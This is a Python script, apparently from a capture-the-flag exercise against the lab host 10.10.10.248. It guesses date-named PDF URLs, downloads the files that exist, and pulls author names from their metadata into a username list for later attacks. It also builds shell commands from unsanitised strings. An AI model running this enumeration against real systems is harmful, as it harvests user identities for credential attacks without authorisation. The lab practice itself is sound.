import requests
import os

class Intelligence():
    def __init__(self,url):
        self.url = url
        self.get_pdfs()
        self.get_users()

    def get_users(self):
        os.system("strings *.pdf | grep -i Creator | awk '{print $2}' | grep -v -i Tex | sed 's/(//' | sed 's/)//' > users.txt")
        print("Users saved in file users.txt")

    def get_pdfs(self):
        for month_first_digit in range(0,2):
            for month_second_digit in range(0,10):
                for day_first_digit in range(0,4):
                    for day_second_digit in range(0,10):
                        final_url = self.url + str(month_first_digit) + str(month_second_digit) + "-" \
                            + str(day_first_digit) + str(day_second_digit) + "-upload.pdf"
                                
                        req_pdf = requests.get(final_url)
                        if req_pdf.status_code != 404:
                            filename = final_url.rsplit('/',1)[1]
                            download = "curl " + final_url + " -o " + filename + " >/dev/null 2>&1"
                            print("Found file in URL: " + final_url + "\nDownloading: " + filename + "\n")
                            os.system(download)

if __name__ == "__main__":
    url = "http://10.10.10.248/documents/2020-"
    Intelligence(url)